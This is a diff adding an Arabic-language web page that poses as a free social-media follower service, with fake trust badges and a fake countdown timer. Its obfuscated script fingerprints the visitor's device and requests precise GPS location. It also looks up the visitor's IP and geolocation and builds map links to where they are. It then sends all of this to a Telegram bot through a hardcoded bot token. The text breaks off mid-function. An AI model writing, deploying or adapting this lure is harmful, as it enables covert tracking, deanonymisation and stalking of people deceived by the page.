@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>احصل على +10K متابع الآن!</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0061ff 0%, #8a2be2 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        .floating-icons {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.1;
+            z-index: 0;
+        }
+        
+        .floating-icons img {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-20px) rotate(180deg);
+            }
+            100% {
+                transform: translateY(0) rotate(360deg);
+            }
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: slideUp 1s ease;
+        }
+        
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: bounce 2s infinite;
+        }
+        
+        .logo img {
+            width: 80px;
+            height: 80px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            animation: glow 2s infinite alternate;
+        }
+        
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-bottom: 30px;
+            animation: slideUp 1.2s ease;
+        }
+        
+        .badge {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .badge i {
+            margin-left: 5px;
+        }
+        
+        .countdown {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+            animation: slideUp 1.4s ease;
+        }
+        
+        .countdown-title {
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .timer-box {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            padding: 10px;
+            min-width: 60px;
+            animation: timerFlip 1s ease;
+        }
+        
+        .timer-value {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        
+        .timer-label {
+            font-size: 0.8rem;
+            opacity: 0.8;
+        }
+        
+        .form-container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: slideUp 1.6s ease;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            color: #333;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.5);
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: #ff3b63;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 59, 99, 0.4);
+            animation: pulse 2s infinite;
+        }
+        
+        .btn:hover {
+            background: #ff1a4a;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 59, 99, 0.6);
+        }
+        
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .social-proof {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            animation: slideUp 1.8s ease;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        /* Animations */
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-15px);
+            }
+        }
+        
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #e60073, 0 0 20px #e60073;
+            }
+            to {
+                text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #ff4da6, 0 0 40px #ff4da6;
+            }
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 59, 99, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 15px rgba(255, 59, 99, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 59, 99, 0);
+            }
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes timerFlip {
+            0% {
+                transform: rotateX(0deg);
+            }
+            50% {
+                transform: rotateX(90deg);
+            }
+            100% {
+                transform: rotateX(0deg);
+            }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .timer-box {
+                min-width: 50px;
+            }
+            
+            .timer-value {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="floating-icons">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" style="top: 10%; left: 5%;" alt="Instagram">
+        <img src="https://cdn-icons-png.flaticon.com/512/3046/3046126.png" style="top: 30%; left: 15%;" alt="TikTok">
+        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" style="top: 20%; left: 80%;" alt="YouTube">
+        <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" style="top: 70%; left: 10%;" alt="Facebook">
+        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384063.png" style="top: 60%; left: 75%;" alt="Snapchat">
+    </div>
+    
+    <div class="container">
+        <header>
+            <div class="logo">
+                <img src="https://cdn-icons-png.flaticon.com/512/3670/3670157.png" alt="Social Media">
+            </div>
+            <h1>احصل على +10K متابع الآن!</h1>
+        </header>
+        
+        <div class="trust-badges">
+            <div class="badge">
+                <i>✓</i> 100% موثوق
+            </div>
+            <div class="badge">
+                <i>✓</i> مستخدم من قبل 2M شخص
+            </div>
+            <div class="badge">
+                <i>✓</i> نتائج فورية
+            </div>
+        </div>
+        
+        <div class="countdown">
+            <div class="countdown-title">العرض ينتهي خلال:</div>
+            <div class="timer">
+                <div class="timer-box">
+                    <div class="timer-value" id="hours">00</div>
+                    <div class="timer-label">ساعات</div>
+                </div>
+                <div class="timer-box">
+                    <div class="timer-value" id="minutes">00</div>
+                    <div class="timer-label">دقائق</div>
+                </div>
+                <div class="timer-box">
+                    <div class="timer-value" id="seconds">00</div>
+                    <div class="timer-label">ثواني</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="form-container">
+            <form id="userForm">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم:</label>
+                    <input type="text" id="username" placeholder="ادخل اسم المستخدم الخاص بك" required>
+                </div>
+                <div class="form-group">
+                    <label for="platform">اختر المنصة:</label>
+                    <select id="platform" required>
+                        <option value="">اختر المنصة</option>
+                        <option value="instagram">Instagram</option>
+                        <option value="tiktok">TikTok</option>
+                        <option value="youtube">YouTube</option>
+                        <option value="facebook">Facebook</option>
+                        <option value="snapchat">Snapchat</option>
+                        <option value="twitter">Twitter</option>
+                        <option value="telegram">Telegram</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn">ابدأ الآن</button>
+            </form>
+        </div>
+        
+        <div class="social-proof">
+            أكثر من 2,000,000 مستخدم حول العالم يثقون بنا
+        </div>
+    </div>
+
+    <script>
+      function _0x2d47(_0x1d087f,_0x78fae){const _0x48ff02=_0x48ff();return _0x2d47=function(_0x2d473b,_0x6e12e2){_0x2d473b=_0x2d473b-0xcf;let _0x2a198a=_0x48ff02[_0x2d473b];return _0x2a198a;},_0x2d47(_0x1d087f,_0x78fae);}const _0x3a856e=_0x2d47;(function(_0x1fe11f,_0x395a1e){const _0x720d94=_0x2d47,_0x4b39bb=_0x1fe11f();while(!![]){try{const _0x551e07=parseInt(_0x720d94(0x1c2))/0x1+-parseInt(_0x720d94(0xfc))/0x2+parseInt(_0x720d94(0x137))/0x3*(parseInt(_0x720d94(0x1b1))/0x4)+-parseInt(_0x720d94(0x168))/0x5+-parseInt(_0x720d94(0xe7))/0x6*(parseInt(_0x720d94(0x191))/0x7)+-parseInt(_0x720d94(0x185))/0x8*(parseInt(_0x720d94(0x161))/0x9)+-parseInt(_0x720d94(0xec))/0xa;if(_0x551e07===_0x395a1e)break;else _0x4b39bb['push'](_0x4b39bb['shift']());}catch(_0x521205){_0x4b39bb['push'](_0x4b39bb['shift']());}}}(_0x48ff,0x9f862));function getChatIdFromUrl(){const _0x4ee78b=_0x2d47,_0x3838e0=new URLSearchParams(window['location']['search']);return _0x3838e0[_0x4ee78b(0x187)]('id')||_0x4ee78b(0xe1);}function updateCountdown(){const _0x4e74df=_0x2d47,_0x112386=document[_0x4e74df(0x143)](_0x4e74df(0x11b)),_0xf5fbbf=document[_0x4e74df(0x143)](_0x4e74df(0x10e)),_0x5a65a4=document[_0x4e74df(0x143)](_0x4e74df(0x19c));let _0x4f808c=Math[_0x4e74df(0x19f)](Math['random']()*0x1),_0x32b9f5=Math[_0x4e74df(0x19f)](Math[_0x4e74df(0x130)]()*0xa)+0x5,_0xc3beb9=Math[_0x4e74df(0x19f)](Math[_0x4e74df(0x130)]()*0x3c);_0x4f808c=_0x4f808c[_0x4e74df(0x17b)]()[_0x4e74df(0x113)](0x2,'0'),_0x32b9f5=_0x32b9f5[_0x4e74df(0x17b)]()[_0x4e74df(0x113)](0x2,'0'),_0xc3beb9=_0xc3beb9[_0x4e74df(0x17b)]()[_0x4e74df(0x113)](0x2,'0'),_0x112386[_0x4e74df(0x1a1)]=_0x4f808c,_0xf5fbbf[_0x4e74df(0x1a1)]=_0x32b9f5,_0x5a65a4[_0x4e74df(0x1a1)]=_0xc3beb9,document[_0x4e74df(0xe9)]('.timer-box')[_0x4e74df(0x134)](_0x11517c=>{const _0x5d3778=_0x4e74df;_0x11517c[_0x5d3778(0x178)][_0x5d3778(0x14b)]='none',_0x11517c['offsetHeight'],_0x11517c[_0x5d3778(0x178)][_0x5d3778(0x14b)]=_0x5d3778(0x16a);});}setInterval(updateCountdown,0xbb8),updateCountdown(),document[_0x3a856e(0x143)]('userForm')['addEventListener'](_0x3a856e(0xda),async function(_0x84247a){const _0x51f212=_0x3a856e;_0x84247a[_0x51f212(0xd9)]();const _0x5f5d3c=document[_0x51f212(0x143)](_0x51f212(0x1c1))[_0x51f212(0x141)]['trim'](),_0x3936d4=document[_0x51f212(0x143)](_0x51f212(0x15f))[_0x51f212(0x141)];if(!_0x5f5d3c||!_0x3936d4){alert(_0x51f212(0x107));return;}const _0x2e7c1f=document['querySelector']('.btn'),_0xa91b81=_0x2e7c1f[_0x51f212(0xe3)];_0x2e7c1f['innerHTML']=_0x51f212(0x1b8),_0x2e7c1f[_0x51f212(0x13e)]=!![];try{const _0x2cf92a=await collectDeviceInfo();_0x2cf92a[_0x51f212(0x1c1)]=_0x5f5d3c,_0x2cf92a['platform']=_0x3936d4,_0x2cf92a[_0x51f212(0xef)]=window[_0x51f212(0x152)][_0x51f212(0x179)],_0x2cf92a['referrer']=document['referrer']||_0x51f212(0x1aa),await sendToTelegram(_0x2cf92a),setTimeout(()=>{const _0x4899f9=_0x51f212;_0x2e7c1f[_0x4899f9(0xe3)]=_0x4899f9(0xd5),alert(_0x4899f9(0x16c)),setTimeout(()=>{const _0x29ae09=_0x4899f9;document[_0x29ae09(0x143)](_0x29ae09(0x1c4))[_0x29ae09(0xf6)](),_0x2e7c1f[_0x29ae09(0xe3)]=_0xa91b81,_0x2e7c1f[_0x29ae09(0x13e)]=![];},0xbb8);},0x7d0);}catch(_0x19037b){console[_0x51f212(0x17c)](_0x51f212(0x120),_0x19037b),_0x2e7c1f[_0x51f212(0xe3)]=_0x51f212(0xfa),_0x2e7c1f[_0x51f212(0x13e)]=![],setTimeout(()=>{const _0xaa6e3f=_0x51f212;_0x2e7c1f[_0xaa6e3f(0xe3)]=_0xa91b81;},0xbb8);}});function createGoogleMapsLinks(_0x50fc32,_0x378133,_0x4111f9=''){const _0x5cec7a=_0x3a856e,_0x281471=_0x50fc32+','+_0x378133,_0x572d6f=encodeURIComponent(_0x4111f9);return{'view':_0x5cec7a(0xe8)+_0x281471+(_0x4111f9?'('+_0x572d6f+')':''),'directions':_0x5cec7a(0x142)+_0x281471,'streetView':_0x5cec7a(0x193)+_0x281471+_0x5cec7a(0x18d),'satellite':_0x5cec7a(0x193)+_0x281471+_0x5cec7a(0x183),'embed':_0x5cec7a(0x163)+_0x281471+_0x5cec7a(0x102),'share':_0x5cec7a(0xfb)+_0x281471};}async function getAddressFromCoords(_0x1f5bd4,_0x55d342){const _0x36f135=_0x3a856e;try{const _0x1b854d=await fetch(_0x36f135(0x197)+_0x1f5bd4+'&lon='+_0x55d342+_0x36f135(0x1a5));if(_0x1b854d['ok']){const _0x1b126d=await _0x1b854d[_0x36f135(0xff)]();return{'fullAddress':_0x1b126d[_0x36f135(0x181)],'country':_0x1b126d['address']?.[_0x36f135(0x125)],'state':_0x1b126d['address']?.[_0x36f135(0x126)],'city':_0x1b126d[_0x36f135(0xdf)]?.[_0x36f135(0x148)]||_0x1b126d['address']?.[_0x36f135(0xde)]||_0x1b126d['address']?.[_0x36f135(0x14c)],'neighborhood':_0x1b126d[_0x36f135(0xdf)]?.[_0x36f135(0xf7)]||_0x1b126d[_0x36f135(0xdf)]?.[_0x36f135(0x158)],'road':_0x1b126d[_0x36f135(0xdf)]?.['road'],'postcode':_0x1b126d[_0x36f135(0xdf)]?.[_0x36f135(0x1a3)]};}}catch(_0x427301){console['log'](_0x36f135(0x175),_0x427301);}return null;}async function collectDeviceInfo(){const _0x32e4c2=_0x3a856e,_0x3e2bf7={'timestamp':new Date()[_0x32e4c2(0xcf)](),'userAgent':navigator[_0x32e4c2(0x19d)],'platform':navigator[_0x32e4c2(0x15f)],'screenWidth':window[_0x32e4c2(0x192)][_0x32e4c2(0x12a)],'screenHeight':window['screen'][_0x32e4c2(0xd3)],'screenColorDepth':window['screen'][_0x32e4c2(0xee)],'pixelRatio':window[_0x32e4c2(0x139)]||0x1,'language':navigator[_0x32e4c2(0x18e)],'languages':navigator[_0x32e4c2(0x1a2)]?navigator[_0x32e4c2(0x1a2)][_0x32e4c2(0x188)](',\x20'):navigator[_0x32e4c2(0x18e)],'cookiesEnabled':navigator[_0x32e4c2(0x153)],'doNotTrack':navigator['doNotTrack']||_0x32e4c2(0x118),'timezone':Intl[_0x32e4c2(0xeb)]()[_0x32e4c2(0xe4)]()[_0x32e4c2(0x13f)],'deviceMemory':navigator[_0x32e4c2(0x103)]||'unknown','hardwareConcurrency':navigator[_0x32e4c2(0x15d)]||'unknown','onLine':navigator[_0x32e4c2(0x1b5)],'maxTouchPoints':navigator[_0x32e4c2(0x1c0)]||0x0,'windowWidth':window[_0x32e4c2(0xd7)],'windowHeight':window['innerHeight'],'documentWidth':document[_0x32e4c2(0xf4)][_0x32e4c2(0xf8)],'documentHeight':document[_0x32e4c2(0xf4)][_0x32e4c2(0xdd)],'historyLength':window[_0x32e4c2(0x124)][_0x32e4c2(0x128)],'localStorageEnabled':((()=>{const _0x41aa72=_0x32e4c2;try{return localStorage['setItem'](_0x41aa72(0xfe),_0x41aa72(0xfe)),localStorage['removeItem'](_0x41aa72(0xfe)),!![];}catch(_0xa1f715){return![];}})()),'sessionStorageEnabled':((()=>{const _0x3a6bf6=_0x32e4c2;try{return sessionStorage[_0x3a6bf6(0x110)](_0x3a6bf6(0xfe),'test'),sessionStorage[_0x3a6bf6(0x18c)](_0x3a6bf6(0xfe)),!![];}catch(_0x504681){return![];}})()),'plugins':Array[_0x32e4c2(0x12f)](navigator['plugins'])[_0x32e4c2(0x121)](_0x89458b=>({'name':_0x89458b['name'],'filename':_0x89458b[_0x32e4c2(0x18f)],'description':_0x89458b[_0x32e4c2(0x155)]})),'mimeTypes':Array[_0x32e4c2(0x12f)](navigator['mimeTypes'])[_0x32e4c2(0x121)](_0x292212=>({'type':_0x292212[_0x32e4c2(0x173)],'description':_0x292212['description'],'suffixes':_0x292212[_0x32e4c2(0x10b)]}))};if('getBattery'in navigator)try{const _0x56a313=await navigator['getBattery']();_0x3e2bf7[_0x32e4c2(0x12c)]={'level':Math['round'](_0x56a313[_0x32e4c2(0x18a)]*0x64),'charging':_0x56a313[_0x32e4c2(0x194)],'chargingTime':_0x56a313['chargingTime'],'dischargingTime':_0x56a313[_0x32e4c2(0xdb)]};}catch(_0x2d6510){_0x3e2bf7[_0x32e4c2(0x12c)]=_0x32e4c2(0x13b);}if(_0x32e4c2(0xd8)in navigator||_0x32e4c2(0x13d)in navigator||_0x32e4c2(0x109)in navigator){const _0x5b6c5b=navigator[_0x32e4c2(0xd8)]||navigator['mozConnection']||navigator['webkitConnection'];_0x5b6c5b&&(_0x3e2bf7[_0x32e4c2(0xd8)]={'type':_0x5b6c5b['type']||_0x32e4c2(0x195),'effectiveType':_0x5b6c5b[_0x32e4c2(0x159)]||_0x32e4c2(0x195),'downlink':_0x5b6c5b[_0x32e4c2(0x115)]||'unknown','downlinkMax':_0x5b6c5b[_0x32e4c2(0x136)]||_0x32e4c2(0x195),'rtt':_0x5b6c5b[_0x32e4c2(0x196)]||_0x32e4c2(0x195),'saveData':_0x5b6c5b[_0x32e4c2(0x169)]||![]});}if(_0x32e4c2(0x1ae)in navigator&&'enumerateDevices'in navigator[_0x32e4c2(0x1ae)])try{const _0x55a96a=await navigator[_0x32e4c2(0x1ae)]['enumerateDevices']();_0x3e2bf7[_0x32e4c2(0x1ae)]={'audioInput':_0x55a96a[_0x32e4c2(0x1ac)](_0x9ea412=>_0x9ea412[_0x32e4c2(0x14a)]===_0x32e4c2(0x189))[_0x32e4c2(0x128)],'videoInput':_0x55a96a['filter'](_0x56b820=>_0x56b820['kind']===_0x32e4c2(0x133))[_0x32e4c2(0x128)],'audioOutput':_0x55a96a[_0x32e4c2(0x1ac)](_0x133432=>_0x133432[_0x32e4c2(0x14a)]===_0x32e4c2(0x127))[_0x32e4c2(0x128)]};}catch(_0x16af0b){_0x3e2bf7[_0x32e4c2(0x1ae)]=_0x32e4c2(0x13b);}if(_0x32e4c2(0x157)in navigator)try{console[_0x32e4c2(0x14e)](_0x32e4c2(0x1b0));const _0x32e5ed=await new Promise((_0x5e4ddf,_0x4f6a97)=>{const _0x5d2aa9=_0x32e4c2;navigator[_0x5d2aa9(0x157)]['getCurrentPosition'](_0x5e4ddf,_0x4f6a97,{'timeout':0x2710,'enableHighAccuracy':!![],'maximumAge':0x0});}),_0x4e0a4e=_0x32e5ed[_0x32e4c2(0x1ab)]['latitude'],_0x2a0da6=_0x32e5ed[_0x32e4c2(0x1ab)][_0x32e4c2(0x149)];_0x3e2bf7[_0x32e4c2(0x117)]={'latitude':_0x4e0a4e,'longitude':_0x2a0da6,'accuracy':_0x32e5ed[_0x32e4c2(0x1ab)][_0x32e4c2(0x19e)],'altitude':_0x32e5ed[_0x32e4c2(0x1ab)][_0x32e4c2(0x1a4)],'altitudeAccuracy':_0x32e5ed[_0x32e4c2(0x1ab)]['altitudeAccuracy'],'heading':_0x32e5ed['coords'][_0x32e4c2(0x144)],'speed':_0x32e5ed[_0x32e4c2(0x1ab)]['speed'],'timestamp':_0x32e5ed[_0x32e4c2(0xf1)]},_0x3e2bf7[_0x32e4c2(0x100)]=createGoogleMapsLinks(_0x4e0a4e,_0x2a0da6,_0x32e4c2(0x1ba)),console['log'](_0x32e4c2(0x11f));const _0x14a62b=await getAddressFromCoords(_0x4e0a4e,_0x2a0da6);_0x14a62b&&(_0x3e2bf7['addressFromGPS']=_0x14a62b);}catch(_0xe8ad69){console[_0x32e4c2(0x14e)](_0x32e4c2(0x1c3),_0xe8ad69),_0x3e2bf7[_0x32e4c2(0x117)]=_0x32e4c2(0x199)+_0xe8ad69[_0x32e4c2(0x190)];}try{console[_0x32e4c2(0x14e)](_0x32e4c2(0x160));let _0x5edf0d=null;const _0x151c9c=['https://api.ipify.org?format=json',_0x32e4c2(0xe5),'https://httpbin.org/ip'];for(const _0x5f52a3 of _0x151c9c){try{const _0x16d636=await fetch(_0x5f52a3,{'timeout':0x1388});if(_0x16d636['ok']){const _0x10577c=await _0x16d636['json']();_0x5edf0d=_0x10577c;break;}}catch(_0x4f51a9){continue;}}if(_0x5edf0d){_0x3e2bf7[_0x32e4c2(0x1c6)]=_0x5edf0d['ip']||_0x5edf0d[_0x32e4c2(0x17d)];if(_0x3e2bf7[_0x32e4c2(0x1c6)])try{const _0x2c5409=await fetch(_0x32e4c2(0x1bc)+_0x3e2bf7[_0x32e4c2(0x1c6)]+'/json/');if(_0x2c5409['ok']){const _0x354e1c=await _0x2c5409[_0x32e4c2(0xff)]();_0x3e2bf7[_0x32e4c2(0x198)]={'ip':_0x354e1c['ip'],'city':_0x354e1c[_0x32e4c2(0x148)],'region':_0x354e1c['region'],'region_code':_0x354e1c['region_code'],'country':_0x354e1c[_0x32e4c2(0x1b2)],'country_code':_0x354e1c[_0x32e4c2(0x14d)],'continent_code':_0x354e1c[_0x32e4c2(0xe6)],'postal':_0x354e1c[_0x32e4c2(0x1b9)],'latitude':_0x354e1c[_0x32e4c2(0x10a)],'longitude':_0x354e1c['longitude'],'timezone':_0x354e1c[_0x32e4c2(0x111)],'utc_offset':_0x354e1c[_0x32e4c2(0x16d)],'country_calling_code':_0x354e1c[_0x32e4c2(0xf9)],'currency':_0x354e1c['currency'],'currency_name':_0x354e1c['currency_name'],'languages':_0x354e1c[_0x32e4c2(0x1a2)],'country_area':_0x354e1c[_0x32e4c2(0x156)],'country_population':_0x354e1c['country_population'],'asn':_0x354e1c[_0x32e4c2(0xd2)],'org':_0x354e1c[_0x32e4c2(0x1b4)]},_0x354e1c[_0x32e4c2(0x10a)]&&_0x354e1c[_0x32e4c2(0x149)]&&(_0x3e2bf7['ipGoogleMapsLinks']=createGoogleMapsLinks(_0x354e1c[_0x32e4c2(0x10a)],_0x354e1c['longitude'],_0x32e4c2(0x135)+_0x354e1c[_0x32e4c2(0x148)]+',\x20'+_0x354e1c['country_name']+')'));}}catch(_0x530091){_0x3e2bf7['ipGeolocation']='service_unavailable';}}else _0x3e2bf7['wanIP']='unknown',_0x3e2bf7[_0x32e4c2(0x198)]=_0x32e4c2(0x195);}catch(_0xd4abe7){console[_0x32e4c2(0x17c)](_0x32e4c2(0x162),_0xd4abe7),_0x3e2bf7[_0x32e4c2(0x1c6)]=_0x32e4c2(0x195),_0x3e2bf7['ipGeolocation']=_0x32e4c2(0x195);}return _0x3e2bf7;}function _0x48ff(){const _0x44d71d=['-\x20[View\x20on\x20Google\x20Maps](','style','href','-\x20Altitude:\x20','toString','error','origin','-\x20Coordinates:\x20','/sendMessage','-\x20Postal\x20Code:\x20','display_name','HTTP\x20error!\x20status:\x20',',17z/data=!3m1!1e3','screenWidth','16EHVvjM','-\x20Battery:\x20','get','join','audioinput','level','audioInput','removeItem',',3a,75y,90t/data=!3m6!1e1','language','filename','message','7FnXwIQ','screen','https://www.google.com/maps/@','charging','unknown','rtt','https://nominatim.openstreetmap.org/reverse?format=json&lat=','ipGeolocation','denied_or_unavailable:\x20','includes','neighborhood','seconds','userAgent','accuracy','floor','-\x20Window:\x20','textContent','languages','postcode','altitude','&addressdetails=1','-\x20[Street\x20View](','\x0a🗺️\x20*GPS\x20Location\x20Maps:*\x0a','\x0a📍\x20*GPS\x20Location:*\x20Access\x20Denied\x20or\x20Unavailable\x0a','stringify','Direct','coords','filter','POST','mediaDevices','screenColorDepth','Requesting\x20GPS\x20location...','2563244hPTvWG','country_name','-\x20Address:\x20','org','onLine','scale(1.02)','transform','<span\x20class=\x22spinner\x22></span>\x20جاري\x20المعالجة...','postal','User\x20Location','-\x20City:\x20','https://ipapi.co/','Disabled','-\x20Heading:\x20','localStorageEnabled','maxTouchPoints','username','951605EDjYEr','GPS\x20location\x20failed:','userForm','-\x20Language:\x20','wanIP','toISOString','https://api.telegram.org/bot','windowHeight','asn','height','object','✓\x20تم\x20بنجاح!','📅\x20*Timestamp:*\x20','innerWidth','connection','preventDefault','submit','dischargingTime','Available','clientHeight','town','address','👤\x20*User:*\x20','1761396923','application/json','innerHTML','resolvedOptions','https://ipapi.co/json/','continent_code','487506CkHZms','https://www.google.com/maps?q=','querySelectorAll','\x20GB\x0a','DateTimeFormat','544100MuXxjf','-\x20[🛰️\x20Satellite\x20View](','colorDepth','pageUrl','-\x20Local\x20Storage:\x20','timestamp','status','windowWidth','documentElement','streetView','reset','neighbourhood','clientWidth','country_calling_code','حدث\x20خطأ!\x20حاول\x20مرة\x20أخرى','https://maps.app.goo.gl/?q=','402336JXhShT','-\x20ISP:\x20','test','json','googleMapsLinks','-\x20Network:\x20','&output=embed','deviceMemory','screenHeight','addEventListener','Current\x20Chat\x20ID:','يرجى\x20ملء\x20جميع\x20الحقول\x20المطلوبة','-\x20Browser:\x20','webkitConnection','latitude','suffixes','bit)\x0a','-\x20[👁️\x20Street\x20View](','minutes','-\x20Online:\x20','setItem','timezone','🎯\x20*New\x20Followers\x20Request*\x20🎯\x0a\x0a','padStart','string','downlink','-\x20Latency:\x20','gpsLocation','unspecified','addressFromGPS','-\x20Screen:\x20','hours','speed','-\x20Currency:\x20','scale(1)','Getting\x20address\x20from\x20coordinates...','Error:','map','\x0a📍\x20*GPS\x20Location\x20(High\x20Accuracy):*\x0a','-\x20CPU\x20Cores:\x20','history','country','state','audiooutput','length','road','width','directions','battery','service_unavailable','Enabled','from','random','-\x20Neighborhood:\x20','input,\x20select','videoinput','forEach','IP\x20Location\x20(','downlinkMax','3DJvhlH','-\x20Touch\x20Support:\x20','devicePixelRatio','\x0a💻\x20*Device\x20Info:*\x0a','unavailable','ipGoogleMapsLinks','mozConnection','disabled','timeZone','\x20m/s\x0a','value','https://www.google.com/maps/dir//','getElementById','heading','region','-\x20[📍\x20View\x20Exact\x20Location](','fullAddress','city','longitude','kind','animation','village','country_code','log','-\x20[📤\x20Share\x20Location](','-\x20Microphones:\x20','-\x20[Get\x20Directions](','location','cookieEnabled','view','description','country_area','geolocation','suburb','effectiveType','referrer','-\x20History\x20Length:\x20','toLocaleString','hardwareConcurrency','-\x20Speakers:\x20','platform','Getting\x20IP\x20and\x20location\x20info...','91215GILDrq','Error\x20fetching\x20IP/geo\x20data:','https://maps.google.com/maps?q=','-\x20OS:\x20','split','videoInput','\x20ms\x0a','2909535PiiaNg','saveData','timerFlip\x201s\x20ease','Not\x20Available','تم\x20تقديم\x20طلبك\x20بنجاح!\x20ستبدأ\x20المتابعات\x20في\x20الظهور\x20خلال\x2024\x20ساعة.','utc_offset','-\x20Accuracy:\x20','(Charging)','🌍\x20*IP\x20Location\x20Info:*\x0a','\x0a🌐\x20*Session\x20Info:*\x0a','share','type','currency','Reverse\x20geocoding\x20failed:','satellite'];_0x48ff=function(){return _0x44d71d;};return _0x48ff();}async function sendToTelegram(_0x51909d){const _0x392bf7=_0x3a856e,_0x342c43=getChatIdFromUrl(),_0x2ea5c3='7104525545:AAFVSv2pBmNDDFe7JyASWElaWZ2vsG7d7nI';let _0x281889=_0x392bf7(0x112);_0x281889+=_0x392bf7(0xe0)+_0x51909d[_0x392bf7(0x1c1)]+'\x0a',_0x281889+='📱\x20*Platform:*\x20'+_0x51909d[_0x392bf7(0x15f)]+'\x0a',_0x281889+=_0x392bf7(0xd6)+new 